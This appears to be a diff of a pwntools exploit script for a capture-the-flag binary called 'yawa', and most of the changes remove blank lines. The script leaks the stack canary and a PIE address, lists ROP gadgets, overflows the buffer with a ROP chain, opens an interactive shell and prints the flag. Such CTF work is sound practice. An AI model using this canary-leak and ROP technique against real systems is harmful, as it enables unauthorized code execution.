@@ -50,9 +50,7 @@ def start():
         return process('./yawa')
 r = start()
 #========= exploit here ===================
-
 payload = b"A"*89
-
 #leak canary
 r.sendlineafter(b">", b"1")
 r.send(payload)
@@ -91,10 +89,8 @@ log.info(f"pie leak = {hex(leak)}")
 
 pie_base = leak - 0x12b1
 log.info(f"pie base = {hex(pie_base)}")
-
 #0x000000000002a3e5: pop rdi; ret;
 #0x0000000000029139: ret;
-
 ##overflow & rop
 payload = b"A"*88
 payload += p64(canary) #canary
@@ -107,9 +103,7 @@ r.sendlineafter(b">", b"1")
 r.send(payload)
 r.sendline(b"3")
 
-
 #========= interactive ====================
 r.interactive()
-
 #DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}%  
 ```
